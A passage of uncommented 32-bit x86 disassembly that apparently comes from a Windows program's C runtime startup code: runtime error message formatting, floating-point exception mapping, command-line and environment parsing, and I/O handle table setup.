  4248fe:	mov    esi,eax
  424900:	shl    esi,0x3
  424903:	cmp    ecx,DWORD PTR [esi+0x462cc0]
  424909:	jne    0x424a32
  42490f:	mov    eax,ds:0x4635bc
  424914:	cmp    eax,0x1
  424917:	je     0x424a0d
  42491d:	cmp    eax,edx
  42491f:	jne    0x42492e
  424921:	cmp    DWORD PTR ds:0x462cb8,0x1
  424928:	je     0x424a0d
  42492e:	cmp    ecx,0xfc
  424934:	je     0x424a32
  42493a:	push   0x104
  42493f:	lea    eax,[ebp-0x10c]
  424945:	push   eax
  424946:	push   edx
  424947:	mov    BYTE PTR [ebp-0x8],dl
  42494a:	call   DWORD PTR ds:0x4290a8
  424950:	test   eax,eax
  424952:	jne    0x424967
  424954:	lea    eax,[ebp-0x10c]
  42495a:	push   0x4295dc
  42495f:	push   eax
  424960:	call   0x425810
  424965:	pop    ecx
  424966:	pop    ecx
  424967:	lea    eax,[ebp-0x10c]
  42496d:	push   eax
  42496e:	lea    edi,[ebp-0x10c]
  424974:	call   0x425a40
  424979:	inc    eax
  42497a:	cmp    eax,0x3c
  42497d:	pop    ecx
  42497e:	jbe    0x4249a9
  424980:	lea    eax,[ebp-0x10c]
  424986:	push   eax
  424987:	call   0x425a40
  42498c:	mov    edi,eax
  42498e:	lea    eax,[ebp-0x10c]
  424994:	sub    eax,0x3b
  424997:	push   0x3
  424999:	add    edi,eax
  42499b:	push   0x4295d8
  4249a0:	push   edi
  4249a1:	call   0x425910
  4249a6:	add    esp,0x10
  4249a9:	push   edi
  4249aa:	call   0x425a40
  4249af:	push   DWORD PTR [esi+0x462cc4]
  4249b5:	mov    ebx,eax
  4249b7:	call   0x425a40
  4249bc:	lea    eax,[ebx+eax*1+0x1c]
  4249c0:	pop    ecx
  4249c1:	add    eax,0x3
  4249c4:	pop    ecx
  4249c5:	and    eax,0xfffffffc
  4249c8:	call   0x425480
  4249cd:	mov    ebx,esp
  4249cf:	push   0x4295bc
  4249d4:	push   ebx
  4249d5:	call   0x425810
  4249da:	push   edi
  4249db:	push   ebx
  4249dc:	call   0x425820
  4249e1:	push   0x4295b8
  4249e6:	push   ebx
  4249e7:	call   0x425820
  4249ec:	push   DWORD PTR [esi+0x462cc4]
  4249f2:	push   ebx
  4249f3:	call   0x425820
  4249f8:	push   0x12010
  4249fd:	push   0x429590
  424a02:	push   ebx
  424a03:	call   0x425712
  424a08:	add    esp,0x2c
  424a0b:	jmp    0x424a32
  424a0d:	push   edx
  424a0e:	lea    eax,[ebp+0x8]
  424a11:	push   eax
  424a12:	lea    esi,[esi+0x462cc4]
  424a18:	push   DWORD PTR [esi]
  424a1a:	call   0x425a40
  424a1f:	pop    ecx
  424a20:	push   eax
  424a21:	push   DWORD PTR [esi]
  424a23:	push   0xfffffff4
  424a25:	call   DWORD PTR ds:0x4290a4
  424a2b:	push   eax
  424a2c:	call   DWORD PTR ds:0x429080
  424a32:	lea    esp,[ebp-0x118]
  424a38:	mov    ecx,DWORD PTR [ebp-0x4]
  424a3b:	xor    ecx,DWORD PTR [ebp+0x4]
  424a3e:	call   0x425afc
  424a43:	pop    edi
  424a44:	pop    esi
  424a45:	pop    ebx
  424a46:	leave  
  424a47:	ret    
  424a48:	mov    eax,ds:0x4635bc
  424a4d:	cmp    eax,0x1
  424a50:	je     0x424a5f
  424a52:	test   eax,eax
  424a54:	jne    0x424a80
  424a56:	cmp    DWORD PTR ds:0x462cb8,0x1
  424a5d:	jne    0x424a80
  424a5f:	push   0xfc
  424a64:	call   0x4248d1
  424a69:	mov    eax,ds:0x463608
  424a6e:	test   eax,eax
  424a70:	pop    ecx
  424a71:	je     0x424a75
  424a73:	call   eax
  424a75:	push   0xff
  424a7a:	call   0x4248d1
  424a7f:	pop    ecx
  424a80:	ret    
  424a81:	push   ebp
  424a82:	mov    ebp,esp
  424a84:	push   ecx
  424a85:	push   ebx
  424a86:	push   esi
  424a87:	push   edi
  424a88:	call   0x4252e9
  424a8d:	mov    edi,DWORD PTR [ebp+0x8]
  424a90:	mov    esi,eax
  424a92:	mov    edx,DWORD PTR [esi+0x54]
  424a95:	mov    eax,ds:0x462dd4
  424a9a:	mov    ecx,edx
  424a9c:	cmp    DWORD PTR [ecx],edi
  424a9e:	je     0x424aad
  424aa0:	lea    ebx,[eax+eax*2]
  424aa3:	add    ecx,0xc
  424aa6:	lea    ebx,[edx+ebx*4]
  424aa9:	cmp    ecx,ebx
  424aab:	jb     0x424a9c
  424aad:	lea    eax,[eax+eax*2]
  424ab0:	lea    eax,[edx+eax*4]
  424ab3:	cmp    ecx,eax
  424ab5:	jae    0x424abb
  424ab7:	cmp    DWORD PTR [ecx],edi
  424ab9:	je     0x424abd
  424abb:	xor    ecx,ecx
  424abd:	test   ecx,ecx
  424abf:	je     0x424bd7
  424ac5:	mov    ebx,DWORD PTR [ecx+0x8]
  424ac8:	test   ebx,ebx
  424aca:	mov    DWORD PTR [ebp+0x8],ebx
  424acd:	je     0x424bd7
  424ad3:	cmp    ebx,0x5
  424ad6:	jne    0x424ae4
  424ad8:	and    DWORD PTR [ecx+0x8],0x0
  424adc:	xor    eax,eax
  424ade:	inc    eax
  424adf:	jmp    0x424be0
  424ae4:	cmp    ebx,0x1
  424ae7:	je     0x424bd2
  424aed:	mov    eax,DWORD PTR [esi+0x58]
  424af0:	mov    DWORD PTR [ebp-0x4],eax
  424af3:	mov    eax,DWORD PTR [ebp+0xc]
  424af6:	mov    DWORD PTR [esi+0x58],eax
  424af9:	mov    eax,DWORD PTR [ecx+0x4]
  424afc:	cmp    eax,0x8
  424aff:	jne    0x424bc4
  424b05:	mov    edx,DWORD PTR ds:0x462dc8
  424b0b:	mov    eax,ds:0x462dcc
  424b10:	add    eax,edx
  424b12:	cmp    edx,eax
  424b14:	jge    0x424b3d
  424b16:	lea    eax,[edx+edx*2]
  424b19:	shl    eax,0x2
  424b1c:	mov    edi,DWORD PTR [esi+0x54]
  424b1f:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424b24:	mov    edi,DWORD PTR ds:0x462dc8
  424b2a:	mov    ebx,DWORD PTR ds:0x462dcc
  424b30:	inc    edx
  424b31:	add    ebx,edi
  424b33:	add    eax,0xc
  424b36:	cmp    edx,ebx
  424b38:	jl     0x424b1c
  424b3a:	mov    ebx,DWORD PTR [ebp+0x8]
  424b3d:	mov    ecx,DWORD PTR [ecx]
  424b3f:	cmp    ecx,0xc000008e
  424b45:	mov    edi,DWORD PTR [esi+0x5c]
  424b48:	jne    0x424b53
  424b4a:	mov    DWORD PTR [esi+0x5c],0x83
  424b51:	jmp    0x424bb7
  424b53:	cmp    ecx,0xc0000090
  424b59:	jne    0x424b64
  424b5b:	mov    DWORD PTR [esi+0x5c],0x81
  424b62:	jmp    0x424bb7
  424b64:	cmp    ecx,0xc0000091
  424b6a:	jne    0x424b75
  424b6c:	mov    DWORD PTR [esi+0x5c],0x84
  424b73:	jmp    0x424bb7
  424b75:	cmp    ecx,0xc0000093
  424b7b:	jne    0x424b86
  424b7d:	mov    DWORD PTR [esi+0x5c],0x85
  424b84:	jmp    0x424bb7
  424b86:	cmp    ecx,0xc000008d
  424b8c:	jne    0x424b97
  424b8e:	mov    DWORD PTR [esi+0x5c],0x82
  424b95:	jmp    0x424bb7
  424b97:	cmp    ecx,0xc000008f
  424b9d:	jne    0x424ba8
  424b9f:	mov    DWORD PTR [esi+0x5c],0x86
  424ba6:	jmp    0x424bb7
  424ba8:	cmp    ecx,0xc0000092
  424bae:	jne    0x424bb7
  424bb0:	mov    DWORD PTR [esi+0x5c],0x8a
  424bb7:	push   DWORD PTR [esi+0x5c]
  424bba:	push   0x8
  424bbc:	call   ebx
  424bbe:	pop    ecx
  424bbf:	mov    DWORD PTR [esi+0x5c],edi
  424bc2:	jmp    0x424bcb
  424bc4:	and    DWORD PTR [ecx+0x8],0x0
  424bc8:	push   eax
  424bc9:	call   ebx
  424bcb:	mov    eax,DWORD PTR [ebp-0x4]
  424bce:	pop    ecx
  424bcf:	mov    DWORD PTR [esi+0x58],eax
  424bd2:	or     eax,0xffffffff
  424bd5:	jmp    0x424be0
  424bd7:	push   DWORD PTR [ebp+0xc]
  424bda:	call   DWORD PTR ds:0x4290ac
  424be0:	pop    edi
  424be1:	pop    esi
  424be2:	pop    ebx
  424be3:	leave  
  424be4:	ret    
  424be5:	cmp    DWORD PTR ds:0x463d6c,0x0
  424bec:	jne    0x424bf3
  424bee:	call   0x42601c
  424bf3:	push   esi
  424bf4:	mov    esi,DWORD PTR ds:0x463d74
  424bfa:	test   esi,esi
  424bfc:	jne    0x424c05
  424bfe:	mov    esi,0x4295f3
  424c03:	jmp    0x424c4a
  424c05:	mov    al,BYTE PTR [esi]
  424c07:	cmp    al,0x22
  424c09:	jne    0x424c33
  424c0b:	inc    esi
  424c0c:	mov    al,BYTE PTR [esi]
  424c0e:	cmp    al,0x22
  424c10:	je     0x424c43
  424c12:	test   al,al
  424c14:	je     0x424c2c
  424c16:	movzx  eax,al
  424c19:	push   eax
  424c1a:	call   0x425b3b
  424c1f:	test   eax,eax
  424c21:	pop    ecx
  424c22:	je     0x424c25
  424c24:	inc    esi
  424c25:	inc    esi
  424c26:	mov    al,BYTE PTR [esi]
  424c28:	cmp    al,0x22
  424c2a:	jne    0x424c12
  424c2c:	cmp    BYTE PTR [esi],0x22
  424c2f:	jne    0x424c44
  424c31:	jmp    0x424c43
  424c33:	cmp    al,0x20
  424c35:	jbe    0x424c44
  424c37:	inc    esi
  424c38:	cmp    BYTE PTR [esi],0x20
  424c3b:	ja     0x424c37
  424c3d:	jmp    0x424c44
  424c3f:	cmp    al,0x20
  424c41:	ja     0x424c4a
  424c43:	inc    esi
  424c44:	mov    al,BYTE PTR [esi]
  424c46:	test   al,al
  424c48:	jne    0x424c3f
  424c4a:	mov    eax,esi
  424c4c:	pop    esi
  424c4d:	ret    
  424c4e:	push   ebx
  424c4f:	xor    ebx,ebx
  424c51:	cmp    DWORD PTR ds:0x463d6c,ebx
  424c57:	push   esi
  424c58:	push   edi
  424c59:	jne    0x424c60
  424c5b:	call   0x42601c
  424c60:	mov    esi,DWORD PTR ds:0x4635b4
  424c66:	xor    edi,edi
  424c68:	cmp    esi,ebx
  424c6a:	jne    0x424c7e
  424c6c:	jmp    0x424c9e
  424c6e:	cmp    al,0x3d
  424c70:	je     0x424c73
  424c72:	inc    edi
  424c73:	push   esi
  424c74:	call   0x425a40
  424c79:	pop    ecx
  424c7a:	lea    esi,[esi+eax*1+0x1]
  424c7e:	mov    al,BYTE PTR [esi]
  424c80:	cmp    al,bl
  424c82:	jne    0x424c6e
  424c84:	lea    eax,[edi*4+0x4]
  424c8b:	push   eax
  424c8c:	call   0x426152
  424c91:	mov    edi,eax
  424c93:	cmp    edi,ebx
  424c95:	pop    ecx
  424c96:	mov    DWORD PTR ds:0x4635e4,edi
  424c9c:	jne    0x424ca3
  424c9e:	or     eax,0xffffffff
  424ca1:	jmp    0x424cfb
  424ca3:	mov    esi,DWORD PTR ds:0x4635b4
  424ca9:	push   ebp
  424caa:	jmp    0x424cd6
  424cac:	push   esi
  424cad:	call   0x425a40
  424cb2:	mov    ebp,eax
  424cb4:	inc    ebp
  424cb5:	cmp    BYTE PTR [esi],0x3d
  424cb8:	pop    ecx
  424cb9:	je     0x424cd4
  424cbb:	push   ebp
  424cbc:	call   0x426152
  424cc1:	cmp    eax,ebx
  424cc3:	pop    ecx
  424cc4:	mov    DWORD PTR [edi],eax
  424cc6:	je     0x424cff
  424cc8:	push   esi
  424cc9:	push   eax
  424cca:	call   0x425810
  424ccf:	pop    ecx
  424cd0:	pop    ecx
  424cd1:	add    edi,0x4
  424cd4:	add    esi,ebp
  424cd6:	cmp    BYTE PTR [esi],bl
  424cd8:	jne    0x424cac
  424cda:	push   DWORD PTR ds:0x4635b4
  424ce0:	call   0x42603a
  424ce5:	mov    DWORD PTR ds:0x4635b4,ebx
  424ceb:	mov    DWORD PTR [edi],ebx
  424ced:	mov    DWORD PTR ds:0x463d60,0x1
  424cf7:	xor    eax,eax
  424cf9:	pop    ecx
  424cfa:	pop    ebp
  424cfb:	pop    edi
  424cfc:	pop    esi
  424cfd:	pop    ebx
  424cfe:	ret    
  424cff:	push   DWORD PTR ds:0x4635e4
  424d05:	call   0x42603a
  424d0a:	mov    DWORD PTR ds:0x4635e4,ebx
  424d10:	or     eax,0xffffffff
  424d13:	jmp    0x424cf9
  424d15:	push   ebp
  424d16:	mov    ebp,esp
  424d18:	push   ecx
  424d19:	push   ebx
  424d1a:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1d:	xor    edx,edx
  424d1f:	cmp    DWORD PTR [ebp+0x8],edx
  424d22:	push   edi
  424d23:	mov    DWORD PTR [esi],edx
  424d25:	mov    edi,ecx
  424d27:	mov    DWORD PTR [ebx],0x1
  424d2d:	je     0x424d38
  424d2f:	mov    ecx,DWORD PTR [ebp+0x8]
  424d32:	add    DWORD PTR [ebp+0x8],0x4
  424d36:	mov    DWORD PTR [ecx],edi
  424d38:	cmp    BYTE PTR [eax],0x22
  424d3b:	jne    0x424d4b
  424d3d:	xor    ecx,ecx
  424d3f:	test   edx,edx
  424d41:	sete   cl
  424d44:	inc    eax
  424d45:	mov    edx,ecx
  424d47:	mov    cl,0x22
  424d49:	jmp    0x424d78
  424d4b:	inc    DWORD PTR [esi]
  424d4d:	test   edi,edi
  424d4f:	je     0x424d56
  424d51:	mov    cl,BYTE PTR [eax]
  424d53:	mov    BYTE PTR [edi],cl
  424d55:	inc    edi
  424d56:	mov    cl,BYTE PTR [eax]
  424d58:	movzx  ebx,cl
  424d5b:	inc    eax
  424d5c:	test   BYTE PTR [ebx+0x463a21],0x4
  424d63:	je     0x424d71
  424d65:	inc    DWORD PTR [esi]
  424d67:	test   edi,edi
  424d69:	je     0x424d70
  424d6b:	mov    bl,BYTE PTR [eax]
  424d6d:	mov    BYTE PTR [edi],bl
  424d6f:	inc    edi
  424d70:	inc    eax
  424d71:	test   cl,cl
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	je     0x424daa
  424d78:	test   edx,edx
  424d7a:	jne    0x424d38
  424d7c:	cmp    cl,0x20
  424d7f:	je     0x424d86
  424d81:	cmp    cl,0x9
  424d84:	jne    0x424d38
  424d86:	test   edi,edi
  424d88:	je     0x424d8e
  424d8a:	and    BYTE PTR [edi-0x1],0x0
  424d8e:	and    DWORD PTR [ebp-0x4],0x0
  424d92:	cmp    BYTE PTR [eax],0x0
  424d95:	je     0x424e71
  424d9b:	mov    cl,BYTE PTR [eax]
  424d9d:	cmp    cl,0x20
  424da0:	je     0x424da7
  424da2:	cmp    cl,0x9
  424da5:	jne    0x424dad
  424da7:	inc    eax
  424da8:	jmp    0x424d9b
  424daa:	dec    eax
  424dab:	jmp    0x424d8e
  424dad:	cmp    BYTE PTR [eax],0x0
  424db0:	je     0x424e71
  424db6:	cmp    DWORD PTR [ebp+0x8],0x0
  424dba:	je     0x424dc5
  424dbc:	mov    ecx,DWORD PTR [ebp+0x8]
  424dbf:	add    DWORD PTR [ebp+0x8],0x4
  424dc3:	mov    DWORD PTR [ecx],edi
  424dc5:	inc    DWORD PTR [ebx]
  424dc7:	xor    ebx,ebx
  424dc9:	inc    ebx
  424dca:	xor    edx,edx
  424dcc:	jmp    0x424dd0
  424dce:	inc    eax
  424dcf:	inc    edx
  424dd0:	cmp    BYTE PTR [eax],0x5c
  424dd3:	je     0x424dce
  424dd5:	cmp    BYTE PTR [eax],0x22
  424dd8:	jne    0x424e00
  424dda:	test   dl,0x1
  424ddd:	jne    0x424dfe
  424ddf:	cmp    DWORD PTR [ebp-0x4],0x0
  424de3:	je     0x424df1
  424de5:	lea    ecx,[eax+0x1]
  424de8:	cmp    BYTE PTR [ecx],0x22
  424deb:	jne    0x424df1
  424ded:	mov    eax,ecx
  424def:	jmp    0x424df3
  424df1:	xor    ebx,ebx
  424df3:	xor    ecx,ecx
  424df5:	cmp    DWORD PTR [ebp-0x4],ecx
  424df8:	sete   cl
  424dfb:	mov    DWORD PTR [ebp-0x4],ecx
  424dfe:	shr    edx,1
  424e00:	test   edx,edx
  424e02:	je     0x424e11
  424e04:	test   edi,edi
  424e06:	je     0x424e0c
  424e08:	mov    BYTE PTR [edi],0x5c
  424e0b:	inc    edi
  424e0c:	inc    DWORD PTR [esi]
  424e0e:	dec    edx
  424e0f:	jne    0x424e04
  424e11:	mov    cl,BYTE PTR [eax]
  424e13:	test   cl,cl
  424e15:	je     0x424e5f
  424e17:	cmp    DWORD PTR [ebp-0x4],0x0
  424e1b:	jne    0x424e27
  424e1d:	cmp    cl,0x20
  424e20:	je     0x424e5f
  424e22:	cmp    cl,0x9
  424e25:	je     0x424e5f
  424e27:	test   ebx,ebx
  424e29:	je     0x424e59
  424e2b:	test   edi,edi
  424e2d:	je     0x424e48
  424e2f:	movzx  edx,cl
  424e32:	test   BYTE PTR [edx+0x463a21],0x4
  424e39:	je     0x424e41
  424e3b:	mov    BYTE PTR [edi],cl
  424e3d:	inc    edi
  424e3e:	inc    eax
  424e3f:	inc    DWORD PTR [esi]
  424e41:	mov    cl,BYTE PTR [eax]
  424e43:	mov    BYTE PTR [edi],cl
  424e45:	inc    edi
  424e46:	jmp    0x424e57
  424e48:	movzx  ecx,cl
  424e4b:	test   BYTE PTR [ecx+0x463a21],0x4
  424e52:	je     0x424e57
  424e54:	inc    eax
  424e55:	inc    DWORD PTR [esi]
  424e57:	inc    DWORD PTR [esi]
  424e59:	inc    eax
  424e5a:	jmp    0x424dc7
  424e5f:	test   edi,edi
  424e61:	je     0x424e67
  424e63:	and    BYTE PTR [edi],0x0
  424e66:	inc    edi
  424e67:	inc    DWORD PTR [esi]
  424e69:	mov    ebx,DWORD PTR [ebp+0xc]
  424e6c:	jmp    0x424d92
  424e71:	mov    eax,DWORD PTR [ebp+0x8]
  424e74:	test   eax,eax
  424e76:	je     0x424e7b
  424e78:	and    DWORD PTR [eax],0x0
  424e7b:	inc    DWORD PTR [ebx]
  424e7d:	pop    edi
  424e7e:	pop    ebx
  424e7f:	leave  
  424e80:	ret    
  424e81:	push   ebp
  424e82:	mov    ebp,esp
  424e84:	push   ecx
  424e85:	push   ecx
  424e86:	push   ebx
  424e87:	push   esi
  424e88:	push   edi
  424e89:	xor    edi,edi
  424e8b:	cmp    DWORD PTR ds:0x463d6c,edi
  424e91:	jne    0x424e98
  424e93:	call   0x42601c
  424e98:	and    BYTE PTR ds:0x463714,0x0
  424e9f:	push   0x104
  424ea4:	mov    esi,0x463610
  424ea9:	push   esi
  424eaa:	push   edi
  424eab:	call   DWORD PTR ds:0x4290a8
  424eb1:	mov    eax,ds:0x463d74
  424eb6:	cmp    eax,edi
  424eb8:	mov    DWORD PTR ds:0x4635f4,esi
  424ebe:	je     0x424ec7
  424ec0:	cmp    BYTE PTR [eax],0x0
  424ec3:	mov    ebx,eax
  424ec5:	jne    0x424ec9
  424ec7:	mov    ebx,esi
  424ec9:	lea    eax,[ebp-0x4]
  424ecc:	push   eax
  424ecd:	push   edi
  424ece:	lea    esi,[ebp-0x8]
  424ed1:	xor    ecx,ecx
  424ed3:	mov    eax,ebx
  424ed5:	call   0x424d15
  424eda:	mov    esi,DWORD PTR [ebp-0x4]
  424edd:	mov    eax,DWORD PTR [ebp-0x8]
  424ee0:	shl    esi,0x2
  424ee3:	add    eax,esi
  424ee5:	push   eax
  424ee6:	call   0x426152
  424eeb:	mov    edi,eax
  424eed:	add    esp,0xc
  424ef0:	test   edi,edi
  424ef2:	jne    0x424ef9
  424ef4:	or     eax,0xffffffff
  424ef7:	jmp    0x424f1e
  424ef9:	lea    eax,[ebp-0x4]
  424efc:	push   eax
  424efd:	lea    ecx,[esi+edi*1]
  424f00:	push   edi
  424f01:	lea    esi,[ebp-0x8]
  424f04:	mov    eax,ebx
  424f06:	call   0x424d15
  424f0b:	mov    eax,DWORD PTR [ebp-0x4]
  424f0e:	dec    eax
  424f0f:	pop    ecx
  424f10:	mov    ds:0x4635d8,eax
  424f15:	pop    ecx
  424f16:	mov    DWORD PTR ds:0x4635dc,edi
  424f1c:	xor    eax,eax
  424f1e:	pop    edi
  424f1f:	pop    esi
  424f20:	pop    ebx
  424f21:	leave  
  424f22:	ret    
  424f23:	push   ecx
  424f24:	push   ecx
  424f25:	mov    eax,ds:0x463718
  424f2a:	push   ebx
  424f2b:	push   ebp
  424f2c:	push   esi
  424f2d:	push   edi
  424f2e:	mov    edi,DWORD PTR ds:0x4290c0
  424f34:	xor    ebx,ebx
  424f36:	xor    esi,esi
  424f38:	cmp    eax,ebx
  424f3a:	push   0x2
  424f3c:	pop    ebp
  424f3d:	jne    0x424f6c
  424f3f:	call   edi
  424f41:	mov    esi,eax
  424f43:	cmp    esi,ebx
  424f45:	je     0x424f53
  424f47:	mov    DWORD PTR ds:0x463718,0x1
  424f51:	jmp    0x424f71
  424f53:	call   DWORD PTR ds:0x429030
  424f59:	cmp    eax,0x78
  424f5c:	jne    0x424f67
  424f5e:	mov    eax,ebp
  424f60:	mov    ds:0x463718,eax
  424f65:	jmp    0x424f6c
  424f67:	mov    eax,ds:0x463718
  424f6c:	cmp    eax,0x1
  424f6f:	jne    0x424fee
  424f71:	cmp    esi,ebx
  424f73:	jne    0x424f7d
  424f75:	call   edi
  424f77:	mov    esi,eax
  424f79:	cmp    esi,ebx
  424f7b:	je     0x424ff6
  424f7d:	cmp    WORD PTR [esi],bx
  424f80:	mov    eax,esi
  424f82:	je     0x424f92
  424f84:	add    eax,ebp
  424f86:	cmp    WORD PTR [eax],bx
  424f89:	jne    0x424f84
  424f8b:	add    eax,ebp
  424f8d:	cmp    WORD PTR [eax],bx
  424f90:	jne    0x424f84
  424f92:	mov    edi,DWORD PTR ds:0x4290bc
  424f98:	push   ebx
  424f99:	push   ebx
  424f9a:	push   ebx
  424f9b:	sub    eax,esi
  424f9d:	push   ebx
  424f9e:	sar    eax,1
  424fa0:	inc    eax
  424fa1:	push   eax
  424fa2:	push   esi
  424fa3:	push   ebx
  424fa4:	push   ebx
  424fa5:	mov    DWORD PTR [esp+0x34],eax
  424fa9:	call   edi
  424fab:	mov    ebp,eax
  424fad:	cmp    ebp,ebx
  424faf:	je     0x424fe3
  424fb1:	push   ebp
  424fb2:	call   0x426152
  424fb7:	cmp    eax,ebx
  424fb9:	pop    ecx
  424fba:	mov    DWORD PTR [esp+0x10],eax
  424fbe:	je     0x424fe3
  424fc0:	push   ebx
  424fc1:	push   ebx
  424fc2:	push   ebp
  424fc3:	push   eax
  424fc4:	push   DWORD PTR [esp+0x24]
  424fc8:	push   esi
  424fc9:	push   ebx
  424fca:	push   ebx
  424fcb:	call   edi
  424fcd:	test   eax,eax
  424fcf:	jne    0x424fdf
  424fd1:	push   DWORD PTR [esp+0x10]
  424fd5:	call   0x42603a
  424fda:	pop    ecx
  424fdb:	mov    DWORD PTR [esp+0x10],ebx
  424fdf:	mov    ebx,DWORD PTR [esp+0x10]
  424fe3:	push   esi
  424fe4:	call   DWORD PTR ds:0x4290b8
  424fea:	mov    eax,ebx
  424fec:	jmp    0x42503e
  424fee:	cmp    eax,ebp
  424ff0:	je     0x424ffa
  424ff2:	cmp    eax,ebx
  424ff4:	je     0x424ffa
  424ff6:	xor    eax,eax
  424ff8:	jmp    0x42503e
  424ffa:	call   DWORD PTR ds:0x4290b4
  425000:	mov    esi,eax
  425002:	cmp    esi,ebx
  425004:	je     0x424ff6
  425006:	cmp    BYTE PTR [esi],bl
  425008:	je     0x425014
  42500a:	inc    eax
  42500b:	cmp    BYTE PTR [eax],bl
  42500d:	jne    0x42500a
  42500f:	inc    eax
  425010:	cmp    BYTE PTR [eax],bl
  425012:	jne    0x42500a
  425014:	sub    eax,esi
  425016:	inc    eax
  425017:	mov    ebp,eax
  425019:	push   ebp
  42501a:	call   0x426152
  42501f:	mov    edi,eax
  425021:	cmp    edi,ebx
  425023:	pop    ecx
  425024:	jne    0x42502a
  425026:	xor    edi,edi
  425028:	jmp    0x425035
  42502a:	push   ebp
  42502b:	push   esi
  42502c:	push   edi
  42502d:	call   0x426170
  425032:	add    esp,0xc
  425035:	push   esi
  425036:	call   DWORD PTR ds:0x4290b0
  42503c:	mov    eax,edi
  42503e:	pop    edi
  42503f:	pop    esi
  425040:	pop    ebp
  425041:	pop    ebx
  425042:	pop    ecx
  425043:	pop    ecx
  425044:	ret    
  425045:	sub    esp,0x48
  425048:	push   ebx
  425049:	mov    ebx,0x480
  42504e:	push   ebx
  42504f:	call   0x426152
  425054:	test   eax,eax
  425056:	pop    ecx
  425057:	jne    0x425061
  425059:	or     eax,0xffffffff
  42505c:	jmp    0x42523e
  425061:	mov    ds:0x463c60,eax
  425066:	mov    DWORD PTR ds:0x463c48,0x20
  425070:	lea    ecx,[eax+0x480]
  425076:	jmp    0x425096
  425078:	and    BYTE PTR [eax+0x4],0x0
  42507c:	or     DWORD PTR [eax],0xffffffff
  42507f:	and    DWORD PTR [eax+0x8],0x0
  425083:	mov    BYTE PTR [eax+0x5],0xa
  425087:	mov    ecx,DWORD PTR ds:0x463c60
  42508d:	add    eax,0x24
  425090:	add    ecx,0x480
  425096:	cmp    eax,ecx
  425098:	jb     0x425078
  42509a:	push   ebp
  42509b:	push   esi
  42509c:	push   edi
  42509d:	lea    eax,[esp+0x14]
  4250a1:	push   eax
  4250a2:	call   DWORD PTR ds:0x429090
  4250a8:	cmp    WORD PTR [esp+0x46],0x0
  4250ae:	je     0x42519d
  4250b4:	mov    eax,DWORD PTR [esp+0x48]
  4250b8:	test   eax,eax
  4250ba:	je     0x42519d
  4250c0:	mov    edi,DWORD PTR [eax]
  4250c2:	lea    ebp,[eax+0x4]
  4250c5:	lea    eax,[edi+ebp*1]
  4250c8:	mov    DWORD PTR [esp+0x10],eax
  4250cc:	mov    eax,0x800
  4250d1:	cmp    edi,eax
  4250d3:	jl     0x4250d7
  4250d5:	mov    edi,eax
  4250d7:	cmp    DWORD PTR ds:0x463c48,edi
  4250dd:	jge    0x42512d
  4250df:	mov    esi,0x463c64
  4250e4:	push   ebx
  4250e5:	call   0x426152
  4250ea:	test   eax,eax
  4250ec:	pop    ecx
  4250ed:	je     0x425127
  4250ef:	add    DWORD PTR ds:0x463c48,0x20
  4250f6:	mov    DWORD PTR [esi],eax
  4250f8:	lea    ecx,[eax+0x480]
  4250fe:	jmp    0x425116
  425100:	and    BYTE PTR [eax+0x4],0x0
  425104:	or     DWORD PTR [eax],0xffffffff
  425107:	and    DWORD PTR [eax+0x8],0x0
  42510b:	mov    BYTE PTR [eax+0x5],0xa
  42510f:	mov    ecx,DWORD PTR [esi]
  425111:	add    eax,0x24
  425114:	add    ecx,ebx
  425116:	cmp    eax,ecx
  425118:	jb     0x425100
  42511a:	add    esi,0x4
  42511d:	cmp    DWORD PTR ds:0x463c48,edi
  425123:	jl     0x4250e4
  425125:	jmp    0x42512d
  425127:	mov    edi,DWORD PTR ds:0x463c48
  42512d:	xor    ebx,ebx
  42512f:	test   edi,edi
  425131:	jle    0x42519d
  425133:	mov    eax,DWORD PTR [esp+0x10]
  425137:	mov    eax,DWORD PTR [eax]
  425139:	cmp    eax,0xffffffff
  42513c:	je     0x425192
  42513e:	mov    cl,BYTE PTR [ebp+0x0]
  425141:	test   cl,0x1
  425144:	je     0x425192
  425146:	test   cl,0x8
  425149:	jne    0x425156
  42514b:	push   eax
  42514c:	call   DWORD PTR ds:0x4290c8
  425152:	test   eax,eax
  425154:	je     0x425192
  425156:	mov    ecx,ebx
  425158:	mov    eax,ebx
  42515a:	and    eax,0x1f
  42515d:	lea    eax,[eax+eax*8]
  425160:	sar    ecx,0x5
  425163:	mov    ecx,DWORD PTR [ecx*4+0x463c60]
  42516a:	lea    esi,[ecx+eax*4]
  42516d:	mov    eax,DWORD PTR [esp+0x10]
  425171:	mov    eax,DWORD PTR [eax]
  425173:	mov    DWORD PTR [esi],eax
  425175:	mov    al,BYTE PTR [ebp+0x0]
  425178:	mov    BYTE PTR [esi+0x4],al
  42517b:	lea    eax,[esi+0xc]
  42517e:	push   0xfa0
  425183:	push   eax
  425184:	call   0x4264bd
  425189:	test   eax,eax
  42518b:	pop    ecx
  42518c:	pop    ecx
  42518d:	je     0x4251bd
  42518f:	inc    DWORD PTR [esi+0x8]
  425192:	add    DWORD PTR [esp+0x10],0x4
  425197:	inc    ebx
  425198:	inc    ebp
  425199:	cmp    ebx,edi
  42519b:	jl     0x425133
  42519d:	xor    ebx,ebx
  42519f:	mov    ecx,DWORD PTR ds:0x463c60
  4251a5:	lea    eax,[ebx+ebx*8]
  4251a8:	lea    esi,[ecx+eax*4]
  4251ab:	cmp    DWORD PTR [esi],0xffffffff
  4251ae:	jne    0x42521f
  4251b0:	test   ebx,ebx
  4251b2:	mov    BYTE PTR [esi+0x4],0x81
  4251b6:	jne    0x4251c2
  4251b8:	push   0xfffffff6
  4251ba:	pop    eax
  4251bb:	jmp    0x4251cc
  4251bd:	or     eax,0xffffffff
  4251c0:	jmp    0x42523b
  4251c2:	mov    eax,ebx
  4251c4:	dec    eax
  4251c5:	neg    eax
  4251c7:	sbb    eax,eax
  4251c9:	add    eax,0xfffffff5
  4251cc:	push   eax
  4251cd:	call   DWORD PTR ds:0x4290a4
  4251d3:	mov    edi,eax
  4251d5:	cmp    edi,0xffffffff
  4251d8:	je     0x425219
  4251da:	push   edi
  4251db:	call   DWORD PTR ds:0x4290c8
  4251e1:	test   eax,eax
  4251e3:	je     0x425219
  4251e5:	and    eax,0xff
  4251ea:	cmp    eax,0x2
  4251ed:	mov    DWORD PTR [esi],edi
  4251ef:	jne    0x4251f7
  4251f1:	or     BYTE PTR [esi+0x4],0x40
  4251f5:	jmp    0x425200
  4251f7:	cmp    eax,0x3
